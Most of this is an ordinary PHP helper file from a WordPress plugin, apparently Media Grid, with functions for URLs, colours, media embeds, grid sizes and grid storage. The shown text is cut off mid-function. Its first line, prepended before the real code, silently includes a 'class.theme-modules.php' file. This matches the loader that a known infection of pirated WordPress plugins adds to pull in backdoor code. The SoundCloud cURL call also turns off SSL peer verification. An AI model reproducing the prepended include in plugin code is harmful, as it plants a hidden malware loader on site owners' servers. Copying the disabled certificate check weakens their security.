<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

// get the current URL
function lcwp_curr_url() {
	$pageURL = 'http';
	
	if (isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] == "on") {$pageURL .= "s";}
	$pageURL .= "://" . $_SERVER['HTTP_HOST'].$_SERVER["REQUEST_URI"];

	return $pageURL;
}
	

// get file extension from a filename
function lcwp_stringToExt($string) {
	$pos = strrpos($string, '.');
	$ext = strtolower(substr($string,$pos));
	return $ext;	
}


// get filename without extension
function lcwp_stringToFilename($string, $raw_name = false) {
	$pos = strrpos($string, '.');
	$name = substr($string,0 ,$pos);
	if(!$raw_name) {$name = ucwords(str_replace('_', ' ', $name));}
	return $name;	
}


// string to url format // NEW FROM v1.11 for non-latin characters 
function lcwp_stringToUrl($string){
	
	// if already exist at least an option, use the default encoding
	if(!get_option('mg_non_latin_char')) {
		$trans = array("à" => "a", "è" => "e", "é" => "e", "ò" => "o", "ì" => "i", "ù" => "u");
		$string = trim(strtr($string, $trans));
		$string = preg_replace('/[^a-zA-Z0-9-.]/', '_', $string);
		$string = preg_replace('/-+/', "_", $string);	
	}
	
	else {$string = trim(urlencode($string));}
	
	return $string;
}


// normalize a url string
function lcwp_urlToName($string) {
	$string = ucwords(str_replace('_', ' ', $string));
	return $string;	
}


// remove a folder and its contents
function lcwp_remove_folder($path) {
	if($objs = @glob($path."/*")){
		foreach($objs as $obj) {
			@is_dir($obj)? lcwp_remove_folder($obj) : @unlink($obj);
		}
	 }
	@rmdir($path);
	return true;
}


// convert HEX to RGB
function mg_hex2rgb($hex) {
   	// if is RGB or transparent - return it
   	$pattern = '/^#[a-f0-9]{6}$/i';
	if(empty($hex) || $hex == 'transparent' || !preg_match($pattern, $hex)) {return $hex;}
  
	$hex = str_replace("#", "", $hex);
   	if(strlen($hex) == 3) {
		$r = hexdec(substr($hex,0,1).substr($hex,0,1));
		$g = hexdec(substr($hex,1,1).substr($hex,1,1));
		$b = hexdec(substr($hex,2,1).substr($hex,2,1));
	} else {
		$r = hexdec(substr($hex,0,2));
		$g = hexdec(substr($hex,2,2));
		$b = hexdec(substr($hex,4,2));
	}
	$rgb = array($r, $g, $b);
  
	return 'rgb('. implode(",", $rgb) .')'; // returns the rgb values separated by commas
}


// convert RGB to HEX
function mg_rgb2hex($rgb) {
   	// if is hex or transparent - return it
   	$pattern = '/^#[a-f0-9]{6}$/i';
	if(empty($rgb) || $rgb == 'transparent' || preg_match($pattern, $rgb)) {return $rgb;}

  	$rgb = explode(',', str_replace(array('rgb(', ')'), '', $rgb));
  	
	$hex = "#";
	$hex .= str_pad(dechex( trim($rgb[0]) ), 2, "0", STR_PAD_LEFT);
	$hex .= str_pad(dechex( trim($rgb[1]) ), 2, "0", STR_PAD_LEFT);
	$hex .= str_pad(dechex( trim($rgb[2]) ), 2, "0", STR_PAD_LEFT);

	return $hex; 
}


// hex color to RGBA
function mg_hex2rgba($hex, $alpha) {
	$rgba = str_replace(array('rgb', ')'), array('rgba', ', '.$alpha.')'), mg_hex2rgb($hex));
	return $rgba;	
}


// add array index after or before another one
//// $to_inject = array(index => val)
//// $what  	= related array index
//// $where 	= before / after
function mg_inject_array_elem($to_inject, $array, $what, $where = 'after') {
	$tot_elems = count($array);
	if(!$tot_elems) {return $to_inject;}
	
	$keys = array_keys($array);
	$pos = array_search($what, $keys); 
	if($pos === false) {return false;}

	$a = 0;
	$new_arr = array(); 
	foreach($array as $index => $val) {
		if($a == $pos && $where == 'before') {
			$new_arr = $new_arr + $to_inject;	
		}
		
		$new_arr[$index] = $val;
		
		if($a == $pos && $where == 'after') {
			$new_arr = $new_arr + $to_inject;	
		}
		
		$a++;
	}
		
	return $new_arr;
}


// create youtube and vimeo embed url
function lcwp_video_embed_url($raw_url, $manual_autoplay = '') {
	if(strpos($raw_url, 'vimeo') !== false) {
		$code = substr($raw_url, (strrpos($raw_url, '/') + 1));
		$url = '//player.vimeo.com/video/'.$code.'?title=0&amp;byline=0&amp;portrait=0';
	}
	elseif(strpos($raw_url, 'youtu.be') !== false) {
		$code = substr($raw_url, (strrpos($raw_url, '/') + 1));
		$url = '//www.youtube.com/embed/'.$code.'?rel=0';	
	}
	elseif(strpos($raw_url, 'dailymotion.com') !== false || strpos($raw_url, 'dai.ly') !== false) {
		if(substr($raw_url, -1) == '/') {$raw_url = substr($raw_url, 0, -1);}
		$parts = explode('/', $raw_url);
		$arr = explode('_', end($parts));
		$url = '//www.dailymotion.com/embed/video/'.$arr[0];	
	}
	else {return 'wrong_url';}
	
	// autoplay
	if( (get_option('mg_video_autoplay') && $manual_autoplay !== false) || $manual_autoplay === true ) {
		$url .= (strpos($raw_url, 'dailymotion.com') !== false) ? '?autoPlay=1' : '&amp;autoplay=1';
	}
	
	return $url;
}


// given video URL - return self-hosted video sources for HTML player
function mg_sh_video_sources($video_url) {
	$ok_src = array();
	$allowed = array('mp4', 'm4v', 'webm', 'ogv', 'wmv', 'flv');
	$sources = explode(',', $video_url); 
		
	foreach($sources as $v_src) {
		$ext = substr(trim(lcwp_stringToExt($v_src)), 1);
		if(in_array($ext, $allowed)) {
			$ok_src[$ext] = trim($v_src);	
		}
	}
	
	$man_src = array();
	foreach($ok_src as $v_type => $url) {
		$man_src[] = '<source src="'.$url.'" type="video/'.$v_type.'">';
	}
	
	return (count($ok_src)) ? implode('', $man_src) : false;	
}


// get soundcloud embed code
function mg_get_soundcloud_embed($track_url, $inline = false, $lazyload = false) {
	
	// search for already queried tracks
	$cached = unserialize( get_option('mg_cached_soundcloud', '') );
	if(!is_array($cached)) {$cached = array();}
	
	// get track ID
	if(isset($cached[ $track_url ])) {
		$track_id = $cached[ $track_url ];	
	}
	else {
		// not cached - use cURL
		$pub = '69c06a70f88e8ec80a414ae55dab369c'; // soundcloud public key
		$url = 'https://api.soundcloud.com/resolve.json?url='. urlencode($track_url) .'&client_id='.$pub;
		
		@ini_set('memory_limit', '256M');
		$ch = curl_init();
	
		//curl_setopt($ch, CURLOPT_AUTOREFERER, true);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_USERAGENT, true);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_URL, $url);
	
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
		curl_setopt($ch, CURLOPT_MAXREDIRS, 3);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
		
		$data = (array)json_decode(curl_exec($ch));
		curl_close($ch);	
		
		// no track found
		if(!isset($data['status']) || $data['status'] != '302 - Found') {
			return '';	
		}
		
		// manage to get track ID
		$arr_1 = explode('?', $data['location']);
		$clean_1 = str_replace('.json', '', $arr_1[0]);
	
		$arr_2 = explode('/', $clean_1);
		$track_id = end($arr_2);
		
		// cache
		$cached[$track_url] = $track_id;
		update_option('mg_cached_soundcloud', serialize($cached));
	}
	

	$autoplay = ((get_option('mg_audio_autoplay') && !$inline) || ($inline && $lazyload)) ? 'true' : 'false';
	$inline_visual = ($inline) ? '&amp;visual=true' : '';
	$lazyload_code = ($lazyload) ? 'src="" data-lazy-src="' : 'src="'; 
	$z_index = ($inline && $lazyload) ? 'style="z-index: -1;"' : '';
	
	return '<iframe class="mg_soundcloud_embed" scrolling="no" frameborder="no" '.$lazyload_code.'//w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/'. $track_id .'&amp;color=ff5500&amp;auto_play='.$autoplay.'&amp;hide_related=true&amp;show_artwork=true'.$inline_visual.'" '.$z_index.'></iframe>';
}



///////////////////////////////////////////////////////


// get translated option name - WPML / Polylang integration
function mg_wpml_string($type, $original_val) {
	if(function_exists('icl_t')) {
		$typename = ($type == 'img_gallery') ? 'Image Gallery' : ucfirst($type);
		$index = $typename.' Attributes - '.$original_val;
		
		return icl_t('Media Grid - Item Attributes', $index, $original_val);
	}
	elseif(function_exists('pll__')) {
		return pll__($original_val);
	}
	else{
		return $original_val;
	}
}


// mq/qtranslate - implement item categories translation
function mg_check_qtranslate() {
	if(is_plugin_active('mqtranslate/mqtranslate.php') || is_plugin_active('qtranslate/qtranslate.php')) {
	  add_action( 'mg_item_categories_add_form', 'qtrans_modifyTermFormFor');
	  add_action( 'mg_item_categories_edit_form', 'qtrans_modifyTermFormFor');
	}
}
if(function_exists('add_action')) {
	add_action('admin_init', 'mg_check_qtranslate');
}


///////////////////////////////////////////////////////

// sanitize input field values
function mg_sanitize_input($val) {
	global $wp_version;
	
	// not sanitize quotes  in WP 4.3 and newer
	if ($wp_version >= 4.3) {
		return trim(esc_attr($val));	
	} else {
		return trim(
			str_replace(array('\'', '"', '<', '>', '&'), array('&apos;', '&quot;', '&lt;', '&gt;', '&amp;'), (string)$val)
		);	
	}
}


// preloader code
function mg_preloader($is_grid_loader = false) {
	$no_init_loader_class = ($is_grid_loader && get_option('mg_no_init_loader')) ? 'mg_no_init_loader' : '';
	
	return '
	<div class="mg_loader '. $no_init_loader_class .'">
		<div class="mgl_1"></div><div class="mgl_2"></div><div class="mgl_3"></div><div class="mgl_4"></div>
	</div>';	
}


// custom type options - indexes 
function mg_main_types() {
	return array(
		'image'			=> __('Image', 'mg_ml'), 
		'img_gallery' 	=> __('Slider', 'mg_ml'), 
		'video' 		=> __('Video', 'mg_ml'), 
		'audio' 		=> __('Audio', 'mg_ml'),
		'post' 			=> __('Posts', 'mg_ml'),
	);	
}


// given the item main type slug - return the name
function mg_item_types($type = false) {
	$types = array(
		'simple_img' 	=> __('Static Image', 'mg_ml'),
		'single_img' 	=> __('Lightbox Image', 'mg_ml'),
		'img_gallery' 	=> __('Lightbox Slider', 'mg_ml'),
		'inl_slider' 	=> __('Inline Slider', 'mg_ml'),
		'video' 		=> __('Lightbox Video', 'mg_ml'),
		'inl_video' 	=> __('Inline Video', 'mg_ml'),
		'audio'			=> __('Lightbox Audio', 'mg_ml'),
		'inl_audio'		=> __('Inline Audio', 'mg_ml'),
		'link'			=> __('Link', 'mg_ml'),
		'lb_text'		=> __('Custom Content', 'mg_ml'),
		'post_contents'	=> __('Post Contents', 'mg_ml'),
		'inl_text'		=> __('Inline Text', 'mg_ml'),
		'spacer'		=> __('Spacer', 'mg_ml'),
	);
	
	if($type === false) {
		return $types;
	} else {
		return (isset($types[$type])) ? $types[$type] : ''; 	
	}
}


// pagination styles
function mg_pag_layouts($type = false) {
	$types = array(
		'standard' 	 	=> __('Commands + full text', 'mg_ml'),
		'only_num'  	=> __('Commands + page numbers', 'mg_ml'),
		'only_arr_dt'	=> __('Only arrows', 'mg_ml'),
		'pag_btn_nums'	=> __('Pages button - numbers', 'mg_ml'),
		'pag_btn_dots'	=> __('Pages button - dots', 'mg_ml'),
		'inf_scroll'	=> __('Infinite scroll', 'mg_ml')
	);
	
	if($type === false) {return $types;}
	else {return $types[$type];}
}



// litteral easing to CSS code
function mg_easing_to_css($easing) {
	switch($easing) {
		case 'ease' : $code = 'ease'; break;
		case 'linear' : $code = 'linear'; break;
		case 'ease-in' : $code = 'ease-in'; break;
		case 'ease-out' : $code = 'ease-out'; break;
		case 'ease-in-out' : $code = 'ease-in-out'; break;
		case 'ease-in-back' : $code = 'cubic-bezier(0.600, -0.280, 0.735, 0.045)'; break;
		case 'ease-out-back' : $code = 'cubic-bezier(0.175, 0.885, 0.320, 1.275)'; break;
		case 'ease-in-out-back' : $code = 'cubic-bezier(0.680, -0.550, 0.265, 1.550)'; break;
	}
	
	return $code;
}

// litteral easing to CSS code - old webkit (safari on Win)
function mg_easing_to_css_ow($easing) {
	switch($easing) {
		case 'ease' : $code = 'ease'; break;
		case 'linear' : $code = 'linear'; break;
		case 'ease-in' : $code = 'ease-in'; break;
		case 'ease-out' : $code = 'ease-out'; break;
		case 'ease-in-out' : $code = 'ease-in-out'; break;
		case 'ease-in-back' : $code = 'cubic-bezier(0.600, 0, 0.735, 0.045)'; break;
		case 'ease-out-back' : $code = 'cubic-bezier(0.175, 0.885, 0.320, 1)'; break;
		case 'ease-in-out-back' : $code = 'cubic-bezier(0.680, 0, 0.265, 1)'; break;
	}
	
	return $code;
}



// lightbox layouts
function mg_lb_layouts($type = false) {
	$types = array(
		'full' 					=> __('Full Width', 'mg_ml'), 
		'side_tripartite' 		=> __('Text on right side - one third', 'mg_ml'),
		'side_tripartite_tol' 	=> __('Text on left side - one third', 'mg_ml'),
		'side_bipartite' 		=> __('Text on right side - one half', 'mg_ml'),
		'side_bipartite_tol' 	=> __('Text on left side - one half', 'mg_ml'),
	);
	
	if($type === false) {return $types;}
	else {return $types[$type];}
}



// slider cropping methods
function mg_galleria_crop_methods($type = false) {
	$types = array(
		'true' 		=> __('Fit, center and crop', 'mg_ml'),
		'false' 	=> __('Scale down', 'mg_ml'),
		'height'	=> __('Scale to fill the height', 'mg_ml'),
		'width'		=> __('Scale to fill the width', 'mg_ml'),
		'landscape'	=> __('Fit images with landscape proportions', 'mg_ml'),
		'portrait' 	=> __('Fit images with portrait proportions', 'mg_ml')
	);
	
	if($type === false) {return $types;}
	else {return $types[$type];}
}



// slider thumbs visibility options
function mg_galleria_thumb_opts($type = false) {
	$types = array(
		'always'	=> __('Always', 'mg_ml'),
		'yes' 		=> __('Yes with toggle button', 'mg_ml'),
		'no' 		=> __('No with toggle button', 'mg_ml'),
		'never' 	=> __('Never', 'mg_ml'),
	);
	
	if($type === false) {return $types;}
	else {return $types[$type];}
}



// deeplinked elements list
function mg_elem_to_deeplink($type = false) {
	$types = array(
		'item' 		=> __("Item's lightbox", 'mg_ml'), 
		'category'	=> __("Category filter", 'mg_ml'), 
		'search'	=> __("Items search", 'mg_ml'),
		'page'		=> __("Grid pagination", 'mg_ml'),
	);
	
	if($type === false) {return $types;}
	else {return $types[$type];}	
}



// item categories array
function mg_item_cats() {
	$cats = array();
	
	foreach(get_terms( 'mg_item_categories', 'hide_empty=0') as $cat) {
		$cats[ $cat->term_id ] = $cat->name;
	}	
	return $cats;
}



####################################################################################################



// image ID to path
function mg_img_id_to_path($img_src) {
	if(is_numeric($img_src)) {
		$wp_img_data = wp_get_attachment_metadata((int)$img_src);
		if($wp_img_data) {
			$upload_dirs = wp_upload_dir();
			$img_src = $upload_dirs['basedir'] . '/' . $wp_img_data['file'];
		}
	}
	
	return $img_src;
}


// thumbnail source switch between timthumb and ewpt
function mg_thumb_src($img_id, $width = false, $height = false, $quality = 80, $alignment = 'c', $resize = 1, $canvas_col = 'FFFFFF', $fx = array()) {
	if(!$img_id) {return '';}
	
	if(get_option('mg_use_timthumb')) {
		$thumb_url = MG_TT_URL.'?src='.mg_img_id_to_path($img_id).'&w='.$width.'&h='.$height.'&a='.$alignment.'&q='.$quality.'&zc='.$resize.'&cc='.$canvas_col;
	} else {
		$thumb_url = easy_wp_thumb($img_id, $width, $height, $quality, $alignment, $resize, $canvas_col , $fx);
	}	
	
	return $thumb_url;
}
 

// image ID to full-size URL 
function mg_img_id_to_fullsize_url($img_id) {
	if(!isset($GLOBALS['mg_img_id_fullurl'])) {$GLOBALS['mg_img_id_fullurl'] = array();}
	
	if(isset($GLOBALS['mg_img_id_fullurl'][$img_id])) {
		return $GLOBALS['mg_img_id_fullurl'][$img_id];
	} 
	else {
		$src = wp_get_attachment_url($img_id);
		$GLOBALS['mg_img_id_fullurl'][$img_id] = $src;	
		
		return $src;
	}
}
 
 
// know if image is a gif
function mg_img_is_gif($img_id) {
	$img_url = mg_img_id_to_fullsize_url($img_id);
	return (!empty($img_url) && substr(strtolower($img_url), -4) == '.gif') ? true : false;
}
 

// get the patterns list 
function mg_patterns_list() {
	$patterns = array();
	$patterns_list = scandir(MG_DIR."/img/patterns");
	
	foreach($patterns_list as $pattern_name) {
		if($pattern_name != '.' && $pattern_name != '..') {
			$patterns[] = $pattern_name;
		}
	}
	return $patterns;	
}


// check if there is at leat one custom option
function mg_cust_opt_exists() {
	$types = mg_main_types();
	$exists = false;
	
	foreach($types as $type => $name) {
		if(get_option('mg_'.$type.'_opt') && count(get_option('mg_'.$type.'_opt')) > 0) {
			$exists = true; 
			break;
		}	
	}
	return $exists;
}



####################################################################################################



// item sizes array - allow additional values through filter (AUTO is manually added where needed)
function mg_sizes() {
	$default = array(
		'1_1' => array('name' => '1/1', 'mobile_ready' => true, 'perc' => 1),
		'1_2' => array('name' => '1/2', 'mobile_ready' => true, 'perc' => 0.499),
		
		'1_3' => array('name' => '1/3', 'mobile_ready' => true, 'perc' => 0.3329),
		'2_3' => array('name' => '2/3', 'mobile_ready' => true, 'perc' => 0.6658),
		
		'1_4' => array('name' => '1/4', 'mobile_ready' => true, 'perc' => 0.25),
		'3_4' => array('name' => '3/4', 'mobile_ready' => true, 'perc' => 0.7499),
		
		'1_5' => array('name' => '1/5', 'mobile_ready' => false, 'perc' => 0.20),
		'2_5' => array('name' => '2/5', 'mobile_ready' => false, 'perc' => 0.399),
		'3_5' => array('name' => '3/5', 'mobile_ready' => false, 'perc' => 0.599),
		'4_5' => array('name' => '4/5', 'mobile_ready' => false, 'perc' => 0.799),
		
		'1_6' => array('name' => '1/6', 'mobile_ready' => false, 'perc' => 0.1658),
		'5_6' => array('name' => '5/6', 'mobile_ready' => false, 'perc' => 0.8329),
		
		'1_7' => array('name' => '1/7', 'mobile_ready' => false, 'perc' => 0.1428),
		'1_8' => array('name' => '1/8', 'mobile_ready' => false, 'perc' => 0.125),
		'1_9' => array('name' => '1/9', 'mobile_ready' => false, 'perc' => 0.1111),
		'1_10'=> array('name' => '1/10', 'mobile_ready' => false, 'perc' => 0.1),
	);
	
	// MG-FILTER - allow filters addition - new ones must comply with existing array structure
	return apply_filters('mg_item_sizes', $default);	
}



// mobile sizes array
function mg_mobile_sizes() {
	$sizes = array();
	foreach(mg_sizes() as $val => $data) {
		if(!$data['mobile_ready']) {continue;}
		$sizes[$val] = $data;	
	}
	
	return $sizes;
}


// sizes to percents
function mg_size_to_perc($size, $leave_auto = false) {
	if($leave_auto && $size == 'auto') {return 'auto';}
	
	foreach(mg_sizes() as $key => $data) {
		if($size == $key) {
			return $data['perc'];	
		}
	}
	
	// size not detected
	return false;
}


// given a normal mg_sizes() array - returns a basic one to be used in cycles 'index' => 'name'
function mg_simpler_sizes_array($sizes) {
	$simplified = array();
	
	foreach($sizes as $index => $data) {
		$simplified[ $index ] = $data['name'];
	}
	
	return $simplified;
}




####################################################################################################



// print type attribute fields
function mg_get_type_opt_fields($type, $post) {
	if(!get_option('mg_'.$type.'_opt')) {return false;}
	$icons = get_option('mg_'.$type.'_opt_icon');
	
	$copt = '
	<h4>'. __('Custom Attributes', 'mg_ml') .'</h4>
	<table class="widefat lcwp_table lcwp_metabox_table mg_user_opt_table">';	
	
	$a = 0;
	foreach(get_option('mg_'.$type.'_opt') as $opt) {
		$val = get_post_meta($post->ID, 'mg_'.$type.'_'.strtolower(lcwp_stringToUrl($opt)), true);
		$icon = (isset($icons[$a])) ? '<i class="mg_item_builder_opt_icon fa '.$icons[$a].'"></i> ' : '';
		
		$copt .= '
		<tr>
          <td class="lcwp_label_td">'.$icon . mg_wpml_string($type, $opt).'</td>
          <td class="lcwp_field_td">
		  	<input type="text" name="mg_'.$type.'_'.strtolower(lcwp_stringToUrl($opt)).'" value="'.mg_sanitize_input($val).'" />
          </td>     
          <td><span class="info"></span></td>
        </tr>';
		
		$a++;
	}
	
	$copt .= '</table>';
	return $copt;
}


// get type options indexes from the main type
function mg_get_type_opt_indexes($type) {
	if($type == 'simple_img' || $type == 'link') {return false;}
	
	if($type == 'single_img') {$copt_id = 'image';}
	else {$copt_id = $type;}

	if(!get_option('mg_'.$copt_id.'_opt')) {return false;}
	
	$indexes = array();
	foreach(get_option('mg_'.$copt_id.'_opt') as $opt) {
		$indexes[] = 'mg_'.$copt_id.'_'.strtolower(lcwp_stringToUrl($opt));
	}
	
	return $indexes;	
}


// prepare the array of not empty custom options for an item
function mg_item_copts_array($type, $post_id) {
	if($type == 'single_img') {$type = 'image';}
	$copts = get_option('mg_'.$type.'_opt');
	
	$arr = array();
	if(is_array($copts)) {
		foreach($copts as $copt) {
			$val = get_post_meta($post_id, 'mg_'. $type .'_'. strtolower(lcwp_stringToUrl($copt)), true);
			
			if($val && $val != '') {
				$arr[$copt] = $val;	
			}
		}
	}
	return $arr;
}



####################################################################################################



// get custom post types and taxonomies array - $onlyfirst to return only first value text
function mg_get_cpt_with_tax($onlyfirst = false) {
	$cpt = get_post_types(array('show_ui' => true, 'publicly_queryable' => true), 'objects');
	$usable = array(); 

	foreach($cpt as $pt) {
		if(in_array($pt->name, array('attachment', 'revision', 'nav_menu_item', 'mg_items'))) {continue;} // exclude known ones
		if(!post_type_supports($pt->name, 'thumbnail')) {continue;} // exclude ones without featured image
		
		$tax = get_object_taxonomies($pt->name, 'objects');
		
		// add only if has a taxonomy
		if(is_array($tax) && !empty($tax)) {
			$tax_array = array();
			
			foreach($tax as $slug => $data) {
				if(in_array($slug, array('post_format'))) {continue;}
				$tax_array[$slug] = $data->labels->name;	
			}
			
			$usable[ $pt->name ] = array(
				'name' => $pt->labels->name,
				'tax' => $tax_array
			);		
		}
	}
	
	$to_return = array();
	
	$a = 0;
	foreach($usable as $slug => $data) {

		$b = 0;
		foreach($data['tax'] as $tax_slug => $tax_name) {
			$val = $slug.'|||'.$tax_slug;
			if($a == 0 && $b == 0) {$first_cpt_cat = $val;}
			
			$to_return[ $val ] = $data['name'].' - '.$tax_name;
			$b++;
		}
		$a++;
	}
	
	return ($onlyfirst && isset($first_cpt_cat)) ? $first_cpt_cat : $to_return;
}


// return post types array from mg_get_cpt_with_tax()
function mg_pt_list() {
	$pts = array('mg_items');
	
	foreach(mg_get_cpt_with_tax() as $val => $name) {
		list($pt, $tax) = explode('|||', $val);
		$pts[] = $pt;
	}
	return array_unique($pts);
}


// given cpt + taxonomy - get taxonomy terms in a select field
function mg_get_taxonomy_terms($cpt_tax, $return = 'array', $selected = false) {
	$arr = explode('|||', $cpt_tax);
	$cats = get_terms($arr[1], 'orderby=name&hide_empty=0');
	
	if($return == 'html') {
		$code = '
		<select data-placeholder="'. __('Select a term', 'mg_ml') .' .." name="mg_cpt_tax_term" class="lcweb-chosen">
			<option value="">'. __('Any term', 'mg_ml') .'</option>';
			
			if(is_array($cats)) {
				foreach($cats as $cat ) {
					$sel = ($selected !== false && $cat->term_id == $selected) ? 'selected="selected"' : '';
					$code .= '<option value="'.$cat->term_id.'" '.$sel.'>'.$cat->name.'</option>'; 
				}
			}
	
		return $code . '</select>'; 
	}
	else {
		$data = array('' => __('Any term', 'mg_ml'));
		if(is_array($cats)) {
			foreach($cats as $cat ) {
				$data[ $cat->term_id ] = $cat->name;
			}
		}
		
		return $data;	
	}
}


// given post ID, returns its post type name
function mg_pt_id_to_name($post_id) {
	$post_type = get_post_type($post_id);
	$obj = get_post_type_object($post_type);
	
	return (empty($obj)) ? 'unknown' : $obj->labels->singular_name;	
}



####################################################################################################



// get grids list template for builder
function mg_builder_grids_list() {
	$grids = get_terms('mg_grids', array('hide_empty' => 0, 'orderby' => 'name'));
	
	if(count($grids)) {
		$code = '';
		
		if(count($grids) > 1) {
			$code = '
			<div class="mg_dd_list_search">
				<form><input type="text" placeholder="'. esc_attr(__("search by typing grid's name or ID", 'mg_ml')) .'" autocomplete="off" /></form>	
			</div>';
		}
		
		$code .= '
		<div class="mg_items_list_scroll">';
		
			foreach ($grids as $grid) {
				$code .= '
				<div class="mg_dd_list_item mgg_'. $grid->term_id .'" rel="'. $grid->term_id .'">
					<em>#'. $grid->term_id .'</em>
					<span class="mg_grid_tit">'. $grid->name .'</span>
					
					<small class="mg_del_grid mg_grids_list_btn" rel="'. $grid->term_id .'" title="'. __('delete grid', 'mg_ml') .'"></small>
					<small class="mg_clone mg_grids_list_btn" rel="'. $grid->term_id .'" title="'. __('clone grid', 'mg_ml') .'"></small>
					<small class="mg_edit_name mg_grids_list_btn" rel="'. $grid->term_id .'" title="'. __("rename grid", 'mg_ml') .'"></small>
				</div>';	
			}
			
		$code .= '</div>';
	}
	else {
		$code = '<div class="mg_dd_list_nogrids"><em>'. __('No grids found', 'mg_ml') .' ..</em></div>';	
	}
	
	return $code;
}



// save grid data - compressing if available
function mg_save_grid_data($grid_id, $arr) {
	$str = serialize($arr);
	$slug = uniqid();
	
	if(function_exists('gzcompress') && function_exists('gzuncompress')) {
		$str = base64_encode(gzcompress($str, 9));
		$slug = 'mg_gzc_' . $slug;
	}
	
	// update grid term
	return wp_update_term($grid_id, 'mg_grids', array('slug' => $slug, 'description' => $str));	
}



// get grid contents - uncompressing || returns associative array('items' => array(), 'cats' => array())
function mg_get_grid_data($grid_id) {
	
	$term = get_term_by('id', $grid_id, 'mg_grids');
	if(empty($term->description)) {return array('items' => array(), 'cats' => array());}

	// if supported - uncompress
	if(strpos($term->slug, 'mg_gzc_') !== false) {
		if(function_exists('gzcompress') && function_exists('gzuncompress')) {
			$data = gzuncompress(base64_decode($term->description));
		}
	}
	else {$data = $term->description;}
	
	return (array)unserialize($data); 
}



//////////////////////////////////////////////////////////



// get related post for Post Contents item type
function mg_post_contents_get_post($item_id) {
	$cpt_tax_arr = explode('|||', get_post_meta($item_id, 'mg_cpt_source', true));
	$term = get_post_meta($item_id, 'mg_cpt_tax_term', true); 
	
	$args = array(
		'post_type' => $cpt_tax_arr[0],  
		'post_status' => 'publish', 
		'posts_per_page' => 1,
		'offset' => (int)get_post_meta($item_id, 'mg_post_query_offset', true),
		'meta_query' => array( 
			array( 'key' => '_thumbnail_id')
		)
	);
	
	if($term) {
		$args['tax_query'] = array(
			array(
				'taxonomy' => $cpt_tax_arr[1],
				'field' => 'id',
				'terms' => $term,
				'include_children' => true
			)
		);	
	} else {
		$args['taxonomy'] = $cpt_tax_arr[1];
	}
	
	$query = new WP_query($args);
	return (count($query->posts)) ? $query->posts[0] : false;	
}



// woocommerce integration - get product attributes
function mg_wc_prod_attr($prod_obj){
    $attributes = $prod_obj->get_attributes();
 		
	$prod_attr = array();
    if (!$attributes) {return $prod_attr;}
	
    foreach ($attributes as $attribute) {

        // skip variations
        if(isset($attribute['variation']) && $attribute['variation'] && !get_option('mg_use_wc_attr_variations')) {continue;}
		

        if($attribute['is_taxonomy']) {
            $terms = wp_get_post_terms($prod_obj->get_id(), $attribute['name'], 'all');
 
            // get the taxonomy
            $tax = $terms[0]->taxonomy;
 
            // get the tax object
            $tax_object = get_taxonomy($tax);
 
            // get tax label
            if ( isset ($tax_object->labels->name) ) {
                $tax_label = $tax_object->labels->name;
            } elseif ( isset( $tax_object->label ) ) {
                $tax_label = $tax_object->label;
            }
 
            foreach ($terms as $term) {
            	if(isset($prod_attr[$tax_label])) {
					$prod_attr[$tax_label][] = $term->name;
				} else {
					$prod_attr[$tax_label] = array($term->name);	
				}
			}
        } else {
 			if(isset($prod_attr[ $attribute['name'] ])) {
				$prod_attr[ $attribute['name'] ][] = $attribute['value'];
			} else {
				$prod_attr[ $attribute['name'] ] = array($attribute['value']);	
			}
        }
    }

    return $prod_attr;
}


// return lightbox custom options / attributes code
function mg_lb_cust_opts_code($post_id, $type, $wc_prod = false) {
	if($type == 'single_img') {$type = 'image';}
	$code = '';
	
	if(!$wc_prod) {
		$type_opts = get_option('mg_'.$type.'_opt');
		$cust_opt = mg_item_copts_array($type, $post_id); 
		$icons = get_option('mg_'.$type.'_opt_icon');
	
		if(count($cust_opt) > 0) {
			$code .= '<ul class="mg_cust_options">';
			
			$a=0;
			foreach($type_opts as $opt) {
				if(isset($cust_opt[$opt])) {				
					$icon = (isset($icons[$a]) && !empty($icons[$a])) ? '<i class="mg_cust_opt_icon fa '.$icons[$a].'"></i> ' : '';
					$code .= '<li>'.$icon.'<span>'.mg_wpml_string($type, $opt).'</span> '.do_shortcode(str_replace(array('&lt;', '&gt;'), array('<', '>'), $cust_opt[$opt])).'</li>';
				}
				$a++;
			}
			
			$code .= '</ul>';
		}
	}
	
	// woocomm attributes
	else {
		$prod_attr = mg_wc_prod_attr($wc_prod);
		if(is_array($prod_attr) && count($prod_attr) > 0 && !get_option('mg_wc_hide_attr')) {
			$code .= '<ul class="mg_cust_options">';
					
			foreach($prod_attr as $attr => $val) {					
				$icon = get_option('mg_wc_attr_'.sanitize_title($attr).'_icon');
				$icon_code = (!empty($icon)) ? '<i class="mg_cust_opt_icon fa '.$icon.'"></i> ' : '';
				
				$code .= '<li>'.$icon_code.'<span>'.$attr.'</span> '.do_shortcode(implode(', ', $val)).'</li>';
			}
					
			// add rating if allowed and there's any
			if(get_post_field('comment_status', $post_id) != 'closed' && $wc_prod->get_rating_count() > 0) {
				$rating = round((float)$wc_prod->get_average_rating());
				$empty_stars = 5 - $rating;
			
				$code .= '<li class="mg_wc_rating"><span>'. __('Rating', 'mg_ml') .'</span>';
				for($a=0; $a < $rating; $a++) 		{$code .= '<i class="fa fa-star"></i>';}
				for($a=0; $a < $empty_stars; $a++) 	{$code .= '<i class="fa fa-star-o"></i>';}
				$code .= '</li>';
			}
			
			$code .= '</ul>';
		}
	}
	
	return $code;
}



// get WP library images
function mg_library_images($page = 1, $per_page = 15, $search = '') {
	$query_images_args = array(
		'post_type' => 'attachment', 
		'post_mime_type' => 'image/jpeg,image/gif,image/jpg,image/png',
		'post_status' => 'inherit', 
		'posts_per_page' => $per_page, 
		'paged' => $page
	);
	if(isset($search) && !empty($search)) {
		$query_images_args['s'] = $search;	
	}
	
	$query_images = new WP_Query( $query_images_args );
	$images = array();
	
	foreach ( $query_images->posts as $image) { 
		$images[] = $image->ID;		
	}
	
	// global images number
	$img_num = $query_images->found_posts;
	
	// calculate the total
	$tot_pag = ceil($img_num / $per_page);
	
